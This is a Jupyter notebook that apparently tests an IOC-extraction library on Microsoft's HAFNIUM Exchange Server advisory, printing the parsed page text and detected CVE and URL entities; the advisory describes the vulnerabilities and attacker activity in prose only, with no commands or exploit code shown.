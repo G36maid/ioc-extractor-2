{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:05.835387Z",
     "start_time": "2021-10-05T10:22:04.835780Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The lab_black extension is already loaded. To reload it, use:\n",
      "  %reload_ext lab_black\n"
     ]
    }
   ],
   "source": [
    "%load_ext lab_black\n",
    "# %load_ext memory_profiler"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:05.860879Z",
     "start_time": "2021-10-05T10:22:05.844767Z"
    }
   },
   "outputs": [],
   "source": [
    "import sys\n",
    "\n",
    "sys.path.append(\"../\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:08.853113Z",
     "start_time": "2021-10-05T10:22:05.869935Z"
    }
   },
   "outputs": [],
   "source": [
    "from functional import seq\n",
    "from itertools import product\n",
    "from magpie.src.analyzer import HTMLElementAnalyzer\n",
    "from magpie.src.extractor import ContentExtractor\n",
    "from magpie.src.parser import EntityParser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:08.930197Z",
     "start_time": "2021-10-05T10:22:08.886795Z"
    }
   },
   "outputs": [],
   "source": [
    "document = open(\n",
    "    # \"../data/hellokitty-ransomware-lacks-stealth-but-still-strikes-home.html\",\n",
    "    \"../data/hafnium-targeting-exchange-servers.html\",\n",
    "    \"r\",\n",
    ").read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:15.343766Z",
     "start_time": "2021-10-05T10:22:08.946422Z"
    }
   },
   "outputs": [],
   "source": [
    "analyzer = HTMLElementAnalyzer(document)\n",
    "extractor = ContentExtractor()\n",
    "parser = EntityParser(analyzer.keywords)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# pipe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:25.887703Z",
     "start_time": "2021-10-05T10:22:15.360425Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<table>\n",
       "<tbody>\n",
       "<tr><td>&lt;Element button at 0x13340bcc8&gt;</td><td>Content(property=&#x27;text&#x27;, text=&#x27;\\n\\t\\tShare\\t&#x27;, span=(165, 174))           </td><td>Text(entity=None, string=&#x27;\\n\\t\\tShare\\t&#x27;, span=(0, 9))            </td></tr>\n",
       "<tr><td>&lt;Element button at 0x13340bcc8&gt;</td><td>Content(property=&#x27;tail&#x27;, text=&#x27;\\n\\t&#x27;, span=(183, 185))                    </td><td>Text(entity=None, string=&#x27;\\n\\t&#x27;, span=(0, 2))                     </td></tr>\n",
       "<tr><td>&lt;Element a at 0x13340bd88&gt;     </td><td>Content(property=&#x27;text&#x27;, text=&#x27;\\n\\t\\t\\t\\tTwitter\\t\\t\\t&#x27;, span=(331, 346)) </td><td>Text(entity=None, string=&#x27;\\n\\t\\t\\t\\tTwitter\\t\\t\\t&#x27;, span=(0, 15)) </td></tr>\n",
       "<tr><td>&lt;Element a at 0x13340bd88&gt;     </td><td>Content(property=&#x27;tail&#x27;, text=&#x27;\\n\\t\\t&#x27;, span=(350, 353))                  </td><td>Text(entity=None, string=&#x27;\\n\\t\\t&#x27;, span=(0, 3))                   </td></tr>\n",
       "<tr><td>&lt;Element a at 0x13340be08&gt;     </td><td>Content(property=&#x27;text&#x27;, text=&#x27;\\n\\t\\t\\t\\tLinkedIn\\t\\t\\t&#x27;, span=(462, 478))</td><td>Text(entity=None, string=&#x27;\\n\\t\\t\\t\\tLinkedIn\\t\\t\\t&#x27;, span=(0, 16))</td></tr>\n",
       "<tr><td>&lt;Element a at 0x13340be08&gt;     </td><td>Content(property=&#x27;tail&#x27;, text=&#x27;\\n\\t\\t&#x27;, span=(482, 485))                  </td><td>Text(entity=None, string=&#x27;\\n\\t\\t&#x27;, span=(0, 3))                   </td></tr>\n",
       "<tr><td>&lt;Element a at 0x13340be88&gt;     </td><td>Content(property=&#x27;text&#x27;, text=&#x27;\\n\\t\\t\\t\\tFacebook\\t\\t\\t&#x27;, span=(264, 280))</td><td>Text(entity=None, string=&#x27;\\n\\t\\t\\t\\tFacebook\\t\\t\\t&#x27;, span=(0, 16))</td></tr>\n",
       "<tr><td>&lt;Element a at 0x13340be88&gt;     </td><td>Content(property=&#x27;tail&#x27;, text=&#x27;\\n\\t\\t&#x27;, span=(284, 287))                  </td><td>Text(entity=None, string=&#x27;\\n\\t\\t&#x27;, span=(0, 3))                   </td></tr>\n",
       "<tr><td>&lt;Element a at 0x13340bf08&gt;     </td><td>Content(property=&#x27;text&#x27;, text=&#x27;\\n\\t\\t\\t\\tEmail\\t\\t\\t&#x27;, span=(306, 319))   </td><td>Text(entity=None, string=&#x27;\\n\\t\\t\\t\\tEmail\\t\\t\\t&#x27;, span=(0, 13))   </td></tr>\n",
       "<tr><td>&lt;Element a at 0x13340bf08&gt;     </td><td>Content(property=&#x27;tail&#x27;, text=&#x27;\\n\\t\\t&#x27;, span=(323, 326))                  </td><td>Text(entity=None, string=&#x27;\\n\\t\\t&#x27;, span=(0, 3))                   </td></tr>\n",
       "</tbody>\n",
       "</table><p>Showing 10 of 407 rows"
      ],
      "text/plain": [
       "[(<Element button at 0x13340bcc8>, Content(property='text', text='\\n\\t\\tShare\\t', span=(165, 174)), Text(entity=None, string='\\n\\t\\tShare\\t', span=(0, 9))), (<Element button at 0x13340bcc8>, Content(property='tail', text='\\n\\t', span=(183, 185)), Text(entity=None, string='\\n\\t', span=(0, 2))), (<Element a at 0x13340bd88>, Content(property='text', text='\\n\\t\\t\\t\\tTwitter\\t\\t\\t', span=(331, 346)), Text(entity=None, string='\\n\\t\\t\\t\\tTwitter\\t\\t\\t', span=(0, 15))), (<Element a at 0x13340bd88>, Content(property='tail', text='\\n\\t\\t', span=(350, 353)), Text(entity=None, string='\\n\\t\\t', span=(0, 3))), (<Element a at 0x13340be08>, Content(property='text', text='\\n\\t\\t\\t\\tLinkedIn\\t\\t\\t', span=(462, 478)), Text(entity=None, string='\\n\\t\\t\\t\\tLinkedIn\\t\\t\\t', span=(0, 16))), (<Element a at 0x13340be08>, Content(property='tail', text='\\n\\t\\t', span=(482, 485)), Text(entity=None, string='\\n\\t\\t', span=(0, 3))), (<Element a at 0x13340be88>, Content(property='text', text='\\n\\t\\t\\t\\tFacebook\\t\\t\\t', span=(264, 280)), Text(entity=None, string='\\n\\t\\t\\t\\tFacebook\\t\\t\\t', span=(0, 16))), (<Element a at 0x13340be88>, Content(property='tail', text='\\n\\t\\t', span=(284, 287)), Text(entity=None, string='\\n\\t\\t', span=(0, 3))), (<Element a at 0x13340bf08>, Content(property='text', text='\\n\\t\\t\\t\\tEmail\\t\\t\\t', span=(306, 319)), Text(entity=None, string='\\n\\t\\t\\t\\tEmail\\t\\t\\t', span=(0, 13))), (<Element a at 0x13340bf08>, Content(property='tail', text='\\n\\t\\t', span=(323, 326)), Text(entity=None, string='\\n\\t\\t', span=(0, 3))), (<Element a at 0x13340bf88>, Content(property='text', text='\\n\\t\\t\\t\\tPrint\\t\\t\\t', span=(69, 82)), Text(entity=None, string='\\n\\t\\t\\t\\tPrint\\t\\t\\t', span=(0, 13))), (<Element a at 0x13340bf88>, Content(property='tail', text='\\n\\t\\t', span=(86, 89)), Text(entity=None, string='\\n\\t\\t', span=(0, 3))), (<Element strong at 0x1333f9108>, Content(property='text', text='Update [03/16/2021]', span=(8, 27)), Text(entity=None, string='Update [03/16/2021]', span=(0, 19))), (<Element strong at 0x1333f9108>, Content(property='tail', text=': Microsoft released updated tools and investigation guidance to help IT Pros and incident response teams identify, remediate, defend against associated attacks: ', span=(36, 198)), Text(entity=None, string=': Microsoft released updated tools and investigation guidance to help IT Pros and incident response teams identify, remediate, defend against associated attacks: ', span=(0, 162))), (<Element a at 0x1333f9148>, Content(property='text', text='Guidance for responders: Investigating and remediating on-premises Exchange Server vulnerabilities', span=(152, 250)), Text(entity=None, string='Guidance for responders: Investigating and remediating on-premises Exchange Server vulnerabilities', span=(0, 98))), (<Element a at 0x1333f9148>, Content(property='tail', text='.', span=(254, 255)), Text(entity=None, string='.', span=(0, 1))), (<Element strong at 0x1333f9208>, Content(property='text', text='Update [03/15/2021]', span=(8, 27)), Text(entity=None, string='Update [03/15/2021]', span=(0, 19))), (<Element strong at 0x1333f9208>, Content(property='tail', text=': Microsoft released a new one-click mitigation tool, the ', span=(36, 94)), Text(entity=None, string=': Microsoft released a new one-click mitigation tool, the ', span=(0, 58))), (<Element a at 0x1333f9248>, Content(property='text', text='Microsoft Exchange On-Premises Mitigation Tool', span=(122, 168)), Text(entity=None, string='Microsoft Exchange On-Premises Mitigation Tool', span=(0, 46))), (<Element a at 0x1333f9248>, Content(property='tail', text=', to help customers who do not have dedicated security or IT teams to apply security updates for Microsoft Exchange\\u202fServer.\\xa0', span=(172, 296)), Text(entity=None, string=', to help customers who do not have dedicated security or IT teams to apply security updates for Microsoft Exchange\\u202fServer.\\xa0', span=(0, 124))), (<Element strong at 0x1333f9308>, Content(property='text', text='Update [03/08/2021]', span=(8, 27)), Text(entity=None, string='Update [03/08/2021]', span=(0, 19))), (<Element strong at 0x1333f9308>, Content(property='tail', text=': Microsoft continues to see multiple actors taking advantage of unpatched systems to attack organizations with on-premises Exchange Server. To aid defenders in investigating these attacks where Microsoft security products and tooling may not be deployed, we are releasing a feed of observed indicators of compromise (IOCs). The feed of malware hashes and known malicious file paths observed in related attacks is available in both JSON and CSV formats at the below GitHub links. This information is being shared as TLP:WHITE: ', span=(36, 563)), Text(entity=None, string=': Microsoft continues to see multiple actors taking advantage of unpatched systems to attack organizations with on-premises Exchange Server. To aid defenders in investigating these attacks where Microsoft security products and tooling may not be deployed, we are releasing a feed of observed indicators of compromise (IOCs). The feed of malware hashes and known malicious file paths observed in related attacks is available in both JSON and CSV formats at the below GitHub links. This information is being shared as TLP:WHITE: ', span=(0, 527))), (<Element a at 0x1333f9348>, Content(property='text', text='CSV format', span=(196, 206)), Text(entity=None, string='CSV format', span=(0, 10))), (<Element a at 0x1333f9348>, Content(property='tail', text=' |\\xa0', span=(210, 213)), Text(entity=None, string=' |\\xa0', span=(0, 3))), (<Element a at 0x1333f9388>, Content(property='text', text='JSON format', span=(197, 208)), Text(entity=None, string='JSON format', span=(0, 11))), (<Element strong at 0x1333f9448>, Content(property='text', text='Update [03/05/2021]', span=(8, 27)), Text(entity=None, string='Update [03/05/2021]', span=(0, 19))), (<Element strong at 0x1333f9448>, Content(property='tail', text=': Microsoft sees increased use of these vulnerabilities in attacks targeting unpatched systems by multiple malicious actors beyond HAFNIUM. To aid customers in investigating these attacks, ', span=(36, 225)), Text(entity=None, string=': Microsoft sees increased use of these vulnerabilities in attacks targeting unpatched systems by multiple malicious actors beyond HAFNIUM. To aid customers in investigating these attacks, ', span=(0, 189))), (<Element em at 0x1333f9488>, Content(property='text', text='Microsoft Security Response Center (MSRC) has provided additional resources, including new mitigation guidance: ', span=(4, 116)), Text(entity=None, string='Microsoft Security Response Center (MSRC) has provided additional resources, including new mitigation guidance: ', span=(0, 112))), (<Element a at 0x1333f94c8>, Content(property='text', text='Microsoft Exchange Server Vulnerabilities Mitigations – March 2021', span=(161, 227)), Text(entity=None, string='Microsoft Exchange Server Vulnerabilities Mitigations – March 2021', span=(0, 66))), (<Element strong at 0x1333f9588>, Content(property='text', text='Update [03/04/2021]', span=(8, 27)), Text(entity=None, string='Update [03/04/2021]', span=(0, 19))), (<Element strong at 0x1333f9588>, Content(property='tail', text=': The Exchange Server team released a script for checking HAFNIUM indicators of compromise (IOCs). See ', span=(36, 139)), Text(entity=None, string=': The Exchange Server team released a script for checking HAFNIUM indicators of compromise (IOCs). See ', span=(0, 103))), (<Element a at 0x1333f95c8>, Content(property='text', text='Scan Exchange log files for indicators of compromise', span=(20, 72)), Text(entity=None, string='Scan Exchange log files for indicators of compromise', span=(0, 52))), (<Element a at 0x1333f95c8>, Content(property='tail', text='.', span=(76, 77)), Text(entity=None, string='.', span=(0, 1))), (<Element p at 0x1333f9648>, Content(property='text', text='Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to ', span=(3, 498)), Text(entity=None, string='Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to ', span=(0, 495))), (<Element p at 0x1333f9648>, Content(property='tail', text='\\n', span=(739, 740)), Text(entity=None, string='\\n', span=(0, 1))), (<Element a at 0x1333f9688>, Content(property='text', text='HAFNIUM', span=(103, 110)), Text(entity=None, string='HAFNIUM', span=(0, 7))), (<Element a at 0x1333f9688>, Content(property='tail', text=', a group assessed to be state-sponsored and operating out of China, based on observed victimology, tactics and procedures.', span=(114, 237)), Text(entity=None, string=', a group assessed to be state-sponsored and operating out of China, based on observed victimology, tactics and procedures.', span=(0, 123))), (<Element p at 0x1333f96c8>, Content(property='text', text='The vulnerabilities recently being exploited were CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065, all of which were addressed in today’s ', span=(3, 160)), Text(entity=None, string='The vulnerabilities recently being exploited were ', span=(0, 50))), (<Element p at 0x1333f96c8>, Content(property='text', text='The vulnerabilities recently being exploited were CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065, all of which were addressed in today’s ', span=(3, 160)), Text(entity='CVE', string='CVE-2021-26855', span=(50, 64))), (<Element p at 0x1333f96c8>, Content(property='text', text='The vulnerabilities recently being exploited were CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065, all of which were addressed in today’s ', span=(3, 160)), Text(entity=None, string=', ', span=(64, 66))), (<Element p at 0x1333f96c8>, Content(property='text', text='The vulnerabilities recently being exploited were CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065, all of which were addressed in today’s ', span=(3, 160)), Text(entity='CVE', string='CVE-2021-26857', span=(66, 80))), (<Element p at 0x1333f96c8>, Content(property='text', text='The vulnerabilities recently being exploited were CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065, all of which were addressed in today’s ', span=(3, 160)), Text(entity=None, string=', ', span=(80, 82))), (<Element p at 0x1333f96c8>, Content(property='text', text='The vulnerabilities recently being exploited were CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065, all of which were addressed in today’s ', span=(3, 160)), Text(entity='CVE', string='CVE-2021-26858', span=(82, 96))), (<Element p at 0x1333f96c8>, Content(property='text', text='The vulnerabilities recently being exploited were CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065, all of which were addressed in today’s ', span=(3, 160)), Text(entity=None, string=', and ', span=(96, 102))), (<Element p at 0x1333f96c8>, Content(property='text', text='The vulnerabilities recently being exploited were CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065, all of which were addressed in today’s ', span=(3, 160)), Text(entity='CVE', string='CVE-2021-27065', span=(102, 116))), (<Element p at 0x1333f96c8>, Content(property='text', text='The vulnerabilities recently being exploited were CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065, all of which were addressed in today’s ', span=(3, 160)), Text(entity=None, string=', all of which were addressed in today’s ', span=(116, 157))), (<Element p at 0x1333f96c8>, Content(property='tail', text='\\n', span=(724, 725)), Text(entity=None, string='\\n', span=(0, 1))), (<Element a at 0x1333f9708>, Content(property='text', text='Microsoft Security Response Center (MSRC) release – Multiple Security Updates Released for Exchange Server', span=(150, 256)), Text(entity=None, string='Microsoft Security Response Center (MSRC) release – Multiple Security Updates Released for Exchange Server', span=(0, 106))), (<Element a at 0x1333f9708>, Content(property='tail', text='. We strongly urge customers to update on-premises systems immediately. Exchange Online is not affected. We have established a resource center that is constantly updated as more information becomes available at ', span=(260, 471)), Text(entity=None, string='. We strongly urge customers to update on-premises systems immediately. Exchange Online is not affected. We have established a resource center that is constantly updated as more information becomes available at ', span=(0, 211))), (<Element strong at 0x1333f9748>, Content(property='tail', text='.', span=(28, 29)), Text(entity=None, string='.', span=(0, 1))), (<Element a at 0x1333f9788>, Content(property='text', text='https://aka.ms/ExchangeVulns', span=(9, 37)), Text(entity='URI', string='https://aka.ms/ExchangeVulns', span=(0, 28))), (<Element p at 0x1333f97c8>, Content(property='text', text='We are sharing this information with our customers and the security community to emphasize the critical nature of these vulnerabilities and the importance of patching all affected systems immediately to protect against these exploits and prevent future abuse across the ecosystem. This blog also continues our mission to shine a light on malicious actors and elevate awareness of the sophisticated tactics and techniques used to target our customers. The related IOCs, ', span=(3, 472)), Text(entity=None, string='We are sharing this information with our customers and the security community to emphasize the critical nature of these vulnerabilities and the importance of patching all affected systems immediately to protect against these exploits and prevent future abuse across the ecosystem. This blog also continues our mission to shine a light on malicious actors and elevate awareness of the sophisticated tactics and techniques used to target our customers. The related IOCs, ', span=(0, 469))), (<Element p at 0x1333f97c8>, Content(property='tail', text='\\n', span=(878, 879)), Text(entity=None, string='\\n', span=(0, 1))), (<Element a at 0x1333f9808>, Content(property='text', text='Azure Sentinel', span=(69, 83)), Text(entity=None, string='Azure Sentinel', span=(0, 14))), (<Element a at 0x1333f9808>, Content(property='tail', text=' advanced hunting queries, and\\xa0', span=(87, 118)), Text(entity=None, string=' advanced hunting queries, and\\xa0', span=(0, 31))), (<Element a at 0x1333f9848>, Content(property='text', text='Microsoft Defender for Endpoint', span=(83, 114)), Text(entity=None, string='Microsoft Defender for Endpoint', span=(0, 31))), (<Element a at 0x1333f9848>, Content(property='tail', text=' product detections and queries shared in this blog will help SOCs proactively hunt for related activity in their environments and elevate any alerts for remediation.', span=(118, 284)), Text(entity=None, string=' product detections and queries shared in this blog will help SOCs proactively hunt for related activity in their environments and elevate any alerts for remediation.', span=(0, 166))), (<Element p at 0x1333f9888>, Content(property='text', text='Microsoft would like to thank our industry colleagues at Volexity and Dubex for reporting different parts of the attack chain and their collaboration in the investigation. Volexity has also ', span=(3, 193)), Text(entity=None, string='Microsoft would like to thank our industry colleagues at Volexity and Dubex for reporting different parts of the attack chain and their collaboration in the investigation. Volexity has also ', span=(0, 190))), (<Element p at 0x1333f9888>, Content(property='tail', text='\\n', span=(546, 547)), Text(entity=None, string='\\n', span=(0, 1))), (<Element a at 0x1333f98c8>, Content(property='text', text='published a blog post', span=(118, 139)), Text(entity=None, string='published a blog post', span=(0, 21))), (<Element a at 0x1333f98c8>, Content(property='tail', text=' with their analysis. It is this level of proactive communication and intelligence sharing that allows the community to come together to get ahead of attacks before they spread and improve security for all.', span=(143, 349)), Text(entity=None, string=' with their analysis. It is this level of proactive communication and intelligence sharing that allows the community to come together to get ahead of attacks before they spread and improve security for all.', span=(0, 206))), (<Element h2 at 0x1333f9908>, Content(property='text', text='Who is HAFNIUM?', span=(4, 19)), Text(entity=None, string='Who is HAFNIUM?', span=(0, 15))), (<Element h2 at 0x1333f9908>, Content(property='tail', text='\\n', span=(24, 25)), Text(entity=None, string='\\n', span=(0, 1))), (<Element p at 0x1333f9948>, Content(property='text', text='HAFNIUM primarily targets entities in the United States across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs.', span=(3, 230)), Text(entity=None, string='HAFNIUM primarily targets entities in the United States across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs.', span=(0, 227))), (<Element p at 0x1333f9948>, Content(property='tail', text='\\n', span=(234, 235)), Text(entity=None, string='\\n', span=(0, 1))), (<Element p at 0x1333f9988>, Content(property='text', text='HAFNIUM has previously compromised victims by exploiting vulnerabilities in internet-facing servers, and has used legitimate open-source frameworks, like ', span=(3, 157)), Text(entity=None, string='HAFNIUM has previously compromised victims by exploiting vulnerabilities in internet-facing servers, and has used legitimate open-source frameworks, like ', span=(0, 154))), (<Element p at 0x1333f9988>, Content(property='tail', text='\\n', span=(390, 391)), Text(entity=None, string='\\n', span=(0, 1))), (<Element a at 0x1333f99c8>, Content(property='text', text='Covenant', span=(34, 42)), Text(entity=None, string='Covenant', span=(0, 8))), (<Element a at 0x1333f99c8>, Content(property='tail', text=', for command and control. Once they’ve gained access to a victim network, HAFNIUM typically exfiltrates data to file sharing sites like ', span=(56, 193)), Text(entity=None, string=', for command and control. Once they’ve gained access to a victim network, HAFNIUM typically exfiltrates data to file sharing sites like ', span=(0, 137))), (<Element a at 0x1333f9a08>, Content(property='text', text='MEGA', span=(27, 31)), Text(entity=None, string='MEGA', span=(0, 4))), (<Element a at 0x1333f9a08>, Content(property='tail', text='.', span=(35, 36)), Text(entity=None, string='.', span=(0, 1))), (<Element p at 0x1333f9a48>, Content(property='text', text='In campaigns unrelated to these vulnerabilities, Microsoft has observed HAFNIUM interacting with victim Office 365 tenants. While they are often unsuccessful in compromising customer accounts, this reconnaissance activity helps the adversary identify more details about their targets’ environments.', span=(3, 301)), Text(entity=None, string='In campaigns unrelated to these vulnerabilities, Microsoft has observed HAFNIUM interacting with victim Office 365 tenants. While they are often unsuccessful in compromising customer accounts, this reconnaissance activity helps the adversary identify more details about their targets’ environments.', span=(0, 298))), (<Element p at 0x1333f9a48>, Content(property='tail', text='\\n', span=(305, 306)), Text(entity=None, string='\\n', span=(0, 1))), (<Element p at 0x1333f9a88>, Content(property='text', text='HAFNIUM operates primarily from leased virtual private servers (VPS) in the United States.', span=(3, 93)), Text(entity=None, string='HAFNIUM operates primarily from leased virtual private servers (VPS) in the United States.', span=(0, 90))), (<Element p at 0x1333f9a88>, Content(property='tail', text='\\n', span=(97, 98)), Text(entity=None, string='\\n', span=(0, 1))), (<Element h2 at 0x1333f9ac8>, Content(property='text', text='Technical details', span=(4, 21)), Text(entity=None, string='Technical details', span=(0, 17))), (<Element h2 at 0x1333f9ac8>, Content(property='tail', text='\\n', span=(26, 27)), Text(entity=None, string='\\n', span=(0, 1))), (<Element p at 0x1333f9b08>, Content(property='text', text='Microsoft is providing the following details to help our customers understand the techniques used by HAFNIUM to exploit these vulnerabilities and enable more effective defense against any future attacks against unpatched systems.', span=(3, 232)), Text(entity=None, string='Microsoft is providing the following details to help our customers understand the techniques used by HAFNIUM to exploit these vulnerabilities and enable more effective defense against any future attacks against unpatched systems.', span=(0, 229))), (<Element p at 0x1333f9b08>, Content(property='tail', text='\\n', span=(236, 237)), Text(entity=None, string='\\n', span=(0, 1))), (<Element a at 0x1333f9b88>, Content(property='text', text='CVE-2021-26855', span=(63, 77)), Text(entity='CVE', string='CVE-2021-26855', span=(0, 14))), (<Element a at 0x1333f9b88>, Content(property='tail', text=' is a server-side request forgery (SSRF) vulnerability in Exchange which allowed the attacker to send arbitrary HTTP requests and authenticate as the Exchange server.', span=(139, 305)), Text(entity=None, string=' is a server-side request forgery (SSRF) vulnerability in Exchange which allowed the attacker to send arbitrary HTTP requests and authenticate as the Exchange server.', span=(0, 166))), (<Element a at 0x1333f9c08>, Content(property='text', text='CVE-2021-26857', span=(63, 77)), Text(entity='CVE', string='CVE-2021-26857', span=(0, 14))), (<Element a at 0x1333f9c08>, Content(property='tail', text=' is an insecure deserialization vulnerability in the Unified Messaging service. Insecure deserialization is where untrusted user-controllable data is deserialized by a program. Exploiting this vulnerability gave HAFNIUM the ability to run code as SYSTEM on the Exchange server. This requires administrator permission or another vulnerability to exploit.', span=(139, 492)), Text(entity=None, string=' is an insecure deserialization vulnerability in the Unified Messaging service. Insecure deserialization is where untrusted user-controllable data is deserialized by a program. Exploiting this vulnerability gave HAFNIUM the ability to run code as SYSTEM on the Exchange server. This requires administrator permission or another vulnerability to exploit.', span=(0, 353))), (<Element a at 0x1333f9c88>, Content(property='text', text='CVE-2021-26858', span=(63, 77)), Text(entity='CVE', string='CVE-2021-26858', span=(0, 14))), (<Element a at 0x1333f9c88>, Content(property='tail', text=' is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the CVE-2021-26855 SSRF vulnerability or by compromising a legitimate admin’s credentials.', span=(139, 478)), Text(entity=None, string=' is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the ', span=(0, 253))), (<Element a at 0x1333f9c88>, Content(property='tail', text=' is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the CVE-2021-26855 SSRF vulnerability or by compromising a legitimate admin’s credentials.', span=(139, 478)), Text(entity='CVE', string='CVE-2021-26855', span=(253, 267))), (<Element a at 0x1333f9c88>, Content(property='tail', text=' is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the CVE-2021-26855 SSRF vulnerability or by compromising a legitimate admin’s credentials.', span=(139, 478)), Text(entity=None, string=' SSRF vulnerability or by compromising a legitimate admin’s credentials.', span=(267, 339))), (<Element a at 0x1333f9d08>, Content(property='text', text='CVE-2021-27065', span=(63, 77)), Text(entity='CVE', string='CVE-2021-27065', span=(0, 14))), (<Element a at 0x1333f9d08>, Content(property='tail', text=' is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the CVE-2021-26855 SSRF vulnerability or by compromising a legitimate admin’s credentials.', span=(139, 478)), Text(entity=None, string=' is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the ', span=(0, 253))), (<Element a at 0x1333f9d08>, Content(property='tail', text=' is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the CVE-2021-26855 SSRF vulnerability or by compromising a legitimate admin’s credentials.', span=(139, 478)), Text(entity='CVE', string='CVE-2021-26855', span=(253, 267))), (<Element a at 0x1333f9d08>, Content(property='tail', text=' is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the CVE-2021-26855 SSRF vulnerability or by compromising a legitimate admin’s credentials.', span=(139, 478)), Text(entity=None, string=' SSRF vulnerability or by compromising a legitimate admin’s credentials.', span=(267, 339))), (<Element h2 at 0x1333f9d48>, Content(property='text', text='Attack details', span=(4, 18)), Text(entity=None, string='Attack details', span=(0, 14))), (<Element h2 at 0x1333f9d48>, Content(property='tail', text='\\n', span=(23, 24)), Text(entity=None, string='\\n', span=(0, 1))), (<Element p at 0x1333f9d88>, Content(property='text', text='After exploiting these vulnerabilities to gain initial access, HAFNIUM operators deployed web shells on the compromised server. Web shells potentially allow attackers to steal data and perform additional malicious actions that lead to further compromise. One example of a web shell deployed by HAFNIUM, written in ASP, is below:', span=(3, 331)), Text(entity=None, string='After exploiting these vulnerabilities to gain initial access, HAFNIUM operators deployed web shells on the compromised server. Web shells potentially allow attackers to steal data and perform additional malicious actions that lead to further compromise. One example of a web shell deployed by HAFNIUM, written in ASP, is below:', span=(0, 328))), (<Element p at 0x1333f9d88>, Content(property='tail', text='\\n', span=(335, 336)), Text(entity=None, string='\\n', span=(0, 1))), (<Element p at 0x1333f9e48>, Content(property='text', text='Following web shell deployment, HAFNIUM operators performed the following post-exploitation activity:', span=(3, 104)), Text(entity=None, string='Following web shell deployment, HAFNIUM operators performed the following post-exploitation activity:', span=(0, 101))), (<Element p at 0x1333f9e48>, Content(property='tail', text='\\n', span=(108, 109)), Text(entity=None, string='\\n', span=(0, 1))), (<Element li at 0x1333f9ec8>, Content(property='text', text='Using Procdump to dump the LSASS process memory:', span=(4, 52)), Text(entity=None, string='Using Procdump to dump the LSASS process memory:', span=(0, 48))), (<Element li at 0x1333f9ec8>, Content(property='tail', text='\\n', span=(57, 58)), Text(entity=None, string='\\n', span=(0, 1))), (<Element li at 0x1333f9fc8>, Content(property='text', text='Using 7-Zip to compress stolen data into ZIP files for exfiltration:', span=(4, 72)), Text(entity=None, string='Using 7-Zip to compress stolen data into ZIP files for exfiltration:', span=(0, 68))), ...]"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# original\n",
    "# %memit\n",
    "seq(analyzer.primary_subtree_leafs).map(\n",
    "    lambda element: seq(extractor.get_contents(element)).map(\n",
    "        lambda content: (element, content)\n",
    "    )\n",
    ").flatten().starmap(\n",
    "    lambda element, content: seq(parser.iterscan(content)).map(\n",
    "        lambda entity: (element, content, entity)\n",
    "    )\n",
    ").flatten()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:35.898519Z",
     "start_time": "2021-10-05T10:22:25.908487Z"
    }
   },
   "outputs": [],
   "source": [
    "# product\n",
